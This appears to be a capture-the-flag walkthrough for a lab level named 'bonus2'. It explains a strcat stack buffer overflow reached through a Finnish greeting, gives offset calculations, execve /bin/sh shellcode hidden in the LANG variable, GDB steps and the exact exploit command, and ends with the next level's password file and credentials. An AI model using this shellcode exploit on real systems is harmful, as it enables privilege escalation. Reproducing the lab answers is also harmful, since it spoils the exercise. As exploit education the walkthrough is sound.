@@ -1,0 +1,100 @@
+1. Download the binary from the server:
+   scp -P 2222 bonus2@localhost:~/bonus2 .
+   Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+2. Analyze the binary with Ghidra:
+   - main() requires 3 arguments (argc == 3)
+   - Creates 72-byte buffer, copies argv[1] (40 bytes) + argv[2] (32 bytes)
+   - Reads LANG environment variable to set language:
+     * "fi" → language = 1 (Finnish)
+     * "nl" → language = 2 (Dutch)
+     * default → language = 0 (English)
+   - Calls greetuser() passing the 72-byte buffer
+   
+   greetuser() function:
+   - Creates 64-byte greeting buffer
+   - Copies language-specific greeting:
+     * English: "Hello " (6 bytes)
+     * Finnish: "Hyvää päivää " (13 bytes)
+     * Dutch: "Goedemiddag! " (14 bytes)
+   - Uses strcat() to concatenate username buffer - NO bounds checking!
+   - Vulnerable to buffer overflow when greeting + username > 64 bytes
+   
+   Key vulnerability:
+   - Finnish greeting (13 bytes) + argv[1] (40 bytes) + argv[2] (32 bytes) = 85 bytes
+   - Overflows 64-byte buffer by 21 bytes
+   - Overwrites saved EBP and return address
+
+3. Calculate exploit offsets:
+   Buffer overflow calculation with Finnish greeting:
+   
+   Offset 0-12:   "Hyvää päivää "     (13 bytes)
+   Offset 13-52:  argv[1]             (40 bytes) → total: 53 bytes
+   Offset 53-70:  argv[2][0:18]       (18 bytes) → total: 71 bytes (reaches saved EBP)
+   Offset 71-74:  Partial saved EBP   (3 bytes)
+   Offset 75-78:  Return address      (4 bytes) ← Target for EIP overwrite
+   
+   Payload structure:
+   - argv[1]: 40 bytes (fills completely, no null terminator)
+   - argv[2]: 18 bytes padding + 4 bytes return address (to shellcode in LANG)
+   
+   Strategy: Store shellcode in LANG environment variable itself!
+   - LANG value: "fi" + NOP_sled + shellcode
+   - This both triggers Finnish greeting AND provides shellcode location
+
+4. Connect to the VM via SSH:
+   ssh bonus2@localhost -p 2222
+   Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+5. Set up exploit environment:
+   Export shellcode embedded in LANG variable:
+   export LANG=$(python -c 'print("fi" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+   
+   This creates LANG=fi with 100-byte NOP sled + 21-byte shellcode.
+   
+   Shellcode source: https://www.exploit-db.com/shellcodes/42428
+   Author: Touhid M.Shaikh
+   Length: 21 bytes (Linux x86 execve /bin/sh)
+
+6. Find LANG address in memory:
+   Use GDB to locate the LANG environment variable:
+   gdb -q ./bonus2
+   break *main+125
+   run test test
+   x/20s *((char**)environ)
+   
+   Look for: LANG=fi\x90\x90\x90...
+   Example address: 0xbffffeb9
+   
+   Calculate target in NOP sled:
+   - LANG starts at: 0xbffffeb9
+   - "LANG=" (5 bytes) → 0xbffffebe
+   - "fi" (2 bytes) → 0xbffffec0 (start of NOP sled)
+   - Target (40 bytes into NOP): 0xbffffec0 + 40 = 0xbffffee8
+
+7. Execute the exploit:
+   ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xe8\xfe\xff\xbf"')
+   
+   Explanation:
+   - argv[1]: "A"*40 (fills buffer, no null terminator allows strcat continuation)
+   - argv[2]: "B"*18 (padding to reach EIP) + "\xe8\xfe\xff\xbf" (return address)
+   
+   What happens:
+   1. main() copies argv[1] and argv[2] into 72-byte buffer
+   2. getenv("LANG") reads "fi\x90\x90..." setting language = 1
+   3. greetuser() copies "Hyvää päivää " (13 bytes) into greeting buffer
+   4. strcat(greeting, buffer) concatenates 72 bytes → overflows!
+   5. Return address overwritten with 0xbffffee8 (points to NOP sled in LANG)
+   6. greetuser() returns → jumps to shellcode → execve("/bin/sh")
+   
+   Shell spawned as bonus3!
+
+8. Read the password:
+   cat /home/user/bonus3/.pass
+   
+   Password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+9. Exit and login as bonus3:
+   exit
+   ssh bonus3@localhost -p 2222
+   Password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
